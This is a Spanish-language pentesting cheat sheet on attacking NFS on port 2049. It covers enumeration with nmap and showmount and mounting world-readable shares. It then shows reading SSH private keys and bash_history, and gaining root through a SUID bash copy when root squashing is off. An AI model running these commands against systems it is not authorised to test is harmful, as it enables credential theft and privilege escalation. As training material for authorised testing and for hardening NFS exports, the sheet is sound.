# Enumeración y Ataque — NFS (Puerto 2049)

## Descripción

NFS (Network File System) permite compartir directorios entre máquinas Linux en red. Si está mal configurado, puede exponer directorios con información sensible o permitir escalada de privilegios mediante el bit SUID.

**Puerto por defecto:** 2049

---

## Paso 1 — Enumeración con Nmap

```shell
nmap -p 2049 -sV -sC TARGET_IP
nmap -p 111,2049 --script nfs* TARGET_IP
```

---

## Paso 2 — Listar shares NFS disponibles

```shell
showmount -e TARGET_IP
```

Ejemplo de salida:
```
Export list for TARGET_IP:
/home/usuario *        # Accesible por todos
/var/backups 10.0.0.0/24
```

El `*` significa que cualquier IP puede montar ese directorio.

---

## Paso 3 — Montar el share

```shell
# Crear punto de montaje
mkdir /tmp/nfs_mount

# Montar el share
mount -t nfs TARGET_IP:/home/usuario /tmp/nfs_mount

# Explorar el contenido
ls -la /tmp/nfs_mount
```

---

## Paso 4 — Buscar información sensible

```shell
# Buscar claves SSH
cat /tmp/nfs_mount/.ssh/id_rsa

# Buscar archivos de configuración
find /tmp/nfs_mount -name "*.conf" -o -name "*.txt" 2>/dev/null

# Ver historial de comandos
cat /tmp/nfs_mount/.bash_history
```

---

## Paso 5 — Escalada de privilegios via NFS SUID ⭐

Si el share está montado sin la opción `no_suid` (configuración insegura), puedes crear un binario SUID en tu Kali que se ejecute como root en la víctima:

```shell
# En Kali — como root
cp /bin/bash /tmp/nfs_mount/bash_suid
chmod +s /tmp/nfs_mount/bash_suid

# En la víctima — ejecutar
/ruta/del/share/bash_suid -p
whoami  # root
```

---

## Paso 6 — Desmontar

```shell
umount /tmp/nfs_mount
```

---

## Checklist rápido

```
[ ] showmount -e TARGET → ver shares disponibles
[ ] mount -t nfs TARGET:/share /tmp/mount
[ ] ls -la → buscar .ssh, archivos de configuración, bash_history
[ ] ¿Share montado sin no_suid? → copiar bash con chmod +s
[ ] Desmontar cuando termines
```
